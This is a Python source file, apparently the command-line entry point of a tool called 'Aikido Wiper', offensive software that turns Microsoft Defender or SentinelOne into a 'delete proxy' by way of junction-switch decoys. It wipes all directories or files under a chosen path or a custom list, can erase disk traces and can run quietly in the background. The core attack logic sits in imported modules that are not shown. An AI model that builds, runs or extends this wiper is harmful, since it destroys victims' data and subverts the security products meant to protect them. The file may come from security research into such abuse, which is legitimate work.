import argparse
from aikido_wiper.indirect_ops.delete.idelete_proxy import IDeleteProxy

from aikido_wiper.indirect_ops.delete.microsoft_defender_delete_proxy import MicrosoftDefenderDeleteProxy
from aikido_wiper.indirect_ops.delete.sentinel_one_delete_proxy import SentinelOneDeleteProxy
from .args_specific_actions import create_junction_switch_proxy, find_custom_paths_from_args, find_dirs_under_dir_from_args, find_files_under_dir_from_args, get_preferred_proxy_arg_name

PROXY_ARG_NAME_TO_PROXY_CREATOR = {
    "MICROSOFT_DEFENDER": (create_junction_switch_proxy, MicrosoftDefenderDeleteProxy),
    "SENTINEL_ONE": (create_junction_switch_proxy, SentinelOneDeleteProxy)
}

DELETION_TARGETS_FINDERS = {
    "ALL_DIRS_UNDER_PATH": find_dirs_under_dir_from_args,
    "ALL_FILES_UNDER_PATH": find_files_under_dir_from_args,
    "CUSTOM_PATHS": find_custom_paths_from_args
}

def create_proxy_from_conf(args) -> IDeleteProxy:
    proxy_arg_name = args.proxy
    if None == proxy_arg_name:
        proxy_arg_name = get_preferred_proxy_arg_name()

    create_func = PROXY_ARG_NAME_TO_PROXY_CREATOR[proxy_arg_name][0]
    proxy_class = PROXY_ARG_NAME_TO_PROXY_CREATOR[proxy_arg_name][1]
    return create_func(proxy_class, args)

def find_deletion_targets_from_args(args):
    return DELETION_TARGETS_FINDERS[args.deletion_target](args)

def parse_args():
    parser = argparse.ArgumentParser(description="Aikido Wiper - Next gen wiping")
    parser.add_argument("-q","--quiet", help="If specified, the wiper will run in the background", action="store_true")

    mode_subparsers = parser.add_subparsers(title="mode", dest="mode", required=True)
    proxy_delete_parser = mode_subparsers.add_parser("PROXY_DELETION")
    erase_disk_traces_parser = mode_subparsers.add_parser("ERASE_DISK_TRACES")

    proxy_delete_parser.add_argument("-p","--proxy", help="The proxy security control to use", type=str, required=True, choices=PROXY_ARG_NAME_TO_PROXY_CREATOR.keys())
    
    delete_target_subparsers = proxy_delete_parser.add_subparsers(title="deletion_target", dest="deletion_target", required=True)

    all_dirs_parser = delete_target_subparsers.add_parser("ALL_DIRS_UNDER_PATH", help="Try to delete all the directories under the Windows drive")
    all_dirs_parser.add_argument("root_path", help="The parent path for all the directories to delete", type=str)
    all_dirs_parser.add_argument("--exclusion-list-path", help="Path to a file with a list of paths to exclude and not mark", required=False)

    all_files_parser = delete_target_subparsers.add_parser("ALL_FILES_UNDER_PATH", help="Try to delete all the files under the Windows drive")
    all_files_parser.add_argument("root_path", help="The parent path for all the file to delete", type=str)
    all_files_parser.add_argument("--exclusion-list-path", help="Path to a file with a list of paths to exclude and not mark", required=False)

    custom_paths_parser = delete_target_subparsers.add_parser("CUSTOM_PATHS", help="Try to delete custom paths")
    custom_paths_parser.add_argument("custom_paths_file", help="Path to a file with a list of paths to try to delete", type=str)

    proxy_delete_parser.add_argument("--decoy-root-dir", help="The path in which all the decoys will be placed in case of a usage of a JunctionSwitchProxy", required=False)

    return parser.parse_args()




